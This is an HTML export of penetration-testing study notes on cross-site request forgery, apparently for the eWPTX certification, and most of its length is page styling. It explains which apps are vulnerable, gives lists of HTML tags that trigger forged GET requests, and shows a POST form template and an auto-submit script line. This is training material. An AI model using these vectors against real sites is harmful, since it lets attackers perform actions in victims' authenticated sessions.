<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Cross-site request forgery (CSRF)</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="ab82b966-1e5f-4bbd-9700-36b781dc4c69" class="page mono"><header><h1 class="page-title"><strong>Cross-site request forgery (CSRF)</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="0e6f4a13-f9f7-4ec2-ad9f-366869d74d7f" class=""><strong>Cross-Site Request Forgery</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#cross-site-request-forgery"></a></strong></h1><ul id="58090a6f-5c90-4b0e-85c5-4f405a33734b" class="bulleted-list"><li style="list-style-type:disc"><em>CSRF</em> or <em>XSRF</em> occurs when developers omit the prevention mechanisms.</li></ul><ul id="dbca22c9-ed2e-4705-a6b6-d49a378920e9" class="bulleted-list"><li style="list-style-type:disc">Is the most known flavor of the Session Riding attack category. Its also pronouced Sea Surf</li></ul><ul id="a1d30b85-3f26-4fc0-9e82-5a7ac8b2e025" class="bulleted-list"><li style="list-style-type:disc">http://seclists.org/bugtraq/2001/Jun/217</li></ul><h2 id="3b29b70f-1f4c-46a5-be2a-c0c057776345" class=""><strong>Recap</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#recap"></a></strong></h2><ul id="d151e87e-f49b-4709-8348-b644bcac3d05" class="bulleted-list"><li style="list-style-type:disc">There is nothing wrong with requests such as requiring external hosted images, javascript code, stylesheet, etc.</li></ul><ul id="01bc92ba-46be-423c-b476-a020d78b67ac" class="bulleted-list"><li style="list-style-type:disc">The wrong part is when these requests are forged in order to send money to the attacker by both performing privilegeda actions and other malicious operations.</li></ul><ul id="23c1c7cb-8786-42ab-bf74-d64afce5447b" class="bulleted-list"><li style="list-style-type:disc">CSRF attacks allows one to exploit the trust relationship between a web app and the HTTP requests made by its users.</li></ul><ul id="46571a80-26d9-47fb-9e00-abfbcc9f26a6" class="bulleted-list"><li style="list-style-type:disc">This forces them to perform arbritary operations on behalf of the attacker</li></ul><h3 id="c6c7dcce-3bd9-4667-89a4-57c0079b1bcf" class=""><strong>Vulnerable</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#vulnerable"></a></strong></h3><p id="3e60c671-d179-4dc4-8076-d57cd335a512" class="">A web app is vuln to CSRF attacks IF:</p><ol type="1" id="dce068ca-8746-4556-b41e-1705bdbca286" class="numbered-list" start="1"><li>When tracking sessions, the application relies both on mechanisms like HTTP cookies and Basic Authentication, which are automatically injected into the request by the browser.</li></ol><ol type="1" id="a9959369-1139-422d-9b35-62b16827c9aa" class="numbered-list" start="2"><li>The attacker is able to determine all the required parameters in order to perform the malicious request.</li></ol><h3 id="2c82d651-8848-4c48-b708-5974cd35a75f" class=""><strong>In order to exploit:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#in-order-to-exploit"></a></strong></h3><ol type="1" id="3f470652-ebb8-4ac7-9a53-99bf589f6497" class="numbered-list" start="1"><li>Make sure that the victim has a valid and active session when the malicious request is executed.</li></ol><ol type="1" id="e4a58048-1135-4373-8836-cdb206e0f9b7" class="numbered-list" start="2"><li>Be able to forge a valid request on behalf of the victim</li></ol><h3 id="e5a92174-016b-45ee-a3a1-7ce12f111efe" class=""><strong>Vulnerable Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#vulnerable-scenarios"></a></strong></h3><ul id="8b50a978-8e3e-466d-aff1-8b720b623ee5" class="bulleted-list"><li style="list-style-type:disc">When the application lacks anti-CSRF defenses</li></ul><ul id="3f0ad505-109f-4d40-9957-3a11a370ae4e" class="bulleted-list"><li style="list-style-type:disc">When the application contains weak anti-CSRF defense mechanisms such as cookie-only based solutions, confirmation screens, using POST, and checking the referer header.</li></ul><blockquote id="1ba94cc1-4ca2-4465-a688-54d99304f1ad" class="">CSRF = an attacker can send a request on behalf of ht victim using their browser, which simply means that the attacker can target any website that is accessible from the victim side.</blockquote><h2 id="9387e968-5416-4856-911f-07ca207d7489" class=""><strong>Attack Vectors</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#attack-vectors"></a></strong></h2><p id="21b86c6a-94b2-499a-bc71-90845d066e4e" class="">Force Browsing with GET</p><h3 id="3933568e-8d03-42c9-aa8d-2072e85c51c4" class=""><strong>Change Email Address</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#change-email-address"></a></strong></h3><p id="5c2703d8-2939-42cc-b59a-399e223d7278" class="">Lets say, provide the new address and subit the form</p><ul id="334381c2-f2e6-4355-9297-7b0173de2a24" class="bulleted-list"><li style="list-style-type:disc">By default the HTTP method is GET</li></ul><ul id="6cca1a4a-e1db-475c-bcb3-488cabd9f3c7" class="bulleted-list"><li style="list-style-type:disc">To exploit this vuln, we need to generate a GET request and then trick the victim (or their browser) into executing it.</li></ul><p id="b89e5a67-b010-468f-b994-b69a2b889bf3" class="">The simplest method to generate a GET request is to use images. This is merely because Getis the standard method used when requesting an image with HTML</p><blockquote id="3c21d52a-4c7e-4df4-9db1-f0c9764b361e" class="">To deliver the attack, we must exploit an existing flaw like XSS, and inject either HTML or Javascript.</blockquote><blockquote id="6ac53e19-3794-47b1-b376-6d2cbaf5617f" class="">Otherwise, we need to social engineer the victim in order to have them visit our malicious page or click a link we provide.</blockquote><p id="a596e394-8df8-4ccb-8a62-73a047f136a0" class="">Tags supported by HTML4 and HTML5</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d0143d5-77e3-41b6-a84e-839471304002" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://www.w3.org/TR/REC-html40/index/attributes.html
http://www.w3.org/html/wg/drafts/html/master/index.html#attributes-1
</code></pre><p id="f6212d6d-2b27-4fde-a482-18158556b1ca" class="">REQUIRE User Interaction:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eb9e2818-1217-413f-a535-e591946ca6d8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;href=URL&gt;click here
&lt;form&gt;&lt;input formaction=URL&gt;
&lt;button formaction=URL&gt;
</code></pre><p id="6b5059f5-94a8-4aac-9148-0e68cb13e054" class="">DO NOT REQUIRE User Interaction:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eaf12342-0e62-46e7-8b3a-ef0452364509" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;iframe src=URL&gt;
&lt;script src=URL&gt;
&lt;input type=&quot;image&quot; src=URL alt=&quot;&quot;&gt;
&lt;embed src=URL&gt;
&lt;audio src=URL&gt;
&lt;video src=URL&gt;
&lt;source src=URL&gt;
&lt;video poster=URL&gt;
&lt;link rel=&quot;stylesheet&quot; href=URL&gt;
&lt;object data=URL&gt;
&lt;body background=URL&gt;
&lt;div style=&quot;backgound:url(URL)&quot;&gt;
&lt;style&gt;body { background:url(URL) } &lt;/script&gt;
</code></pre><h2 id="8f0108ee-abb8-4b77-ae00-dc9881ec733c" class=""><strong>Post Requests</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#post-requests"></a></strong></h2><p id="ed52060a-434a-4604-a367-a896ee216200" class="">Using only HTML, the only way to forge POST requests is with the attribute method of tah FORM:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6288f30a-dcbe-4f3e-aee8-e5ce3769e318" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;form action=&quot;somewhere&quot; method=&quot;POST&quot;&gt;
</code></pre><ul id="166cc2b7-ffc4-4b2d-b2fa-f619f7528f2a" class="bulleted-list"><li style="list-style-type:disc">As a result, we need to create a cloned form and then social engineer the victim into clicking the submit button.</li></ul><ul id="e05ac85c-7b61-4e6a-96b7-675d6737d12d" class="bulleted-list"><li style="list-style-type:disc">We can use HTML + Javascript to create a more effective attack that does not require user interaction</li></ul><h3 id="c736d770-3387-4a88-9d30-0d93341580eb" class=""><strong>Auto-submitting Form</strong><strong><a href="https://johnermac.github.io/notes/ewptx/csrf/#auto-submitting-form"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9d70fe7f-27cc-4669-b545-e9d15004dcf6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;document.getElementById(&quot;CSRForm&quot;).submit()&lt;/script&gt;
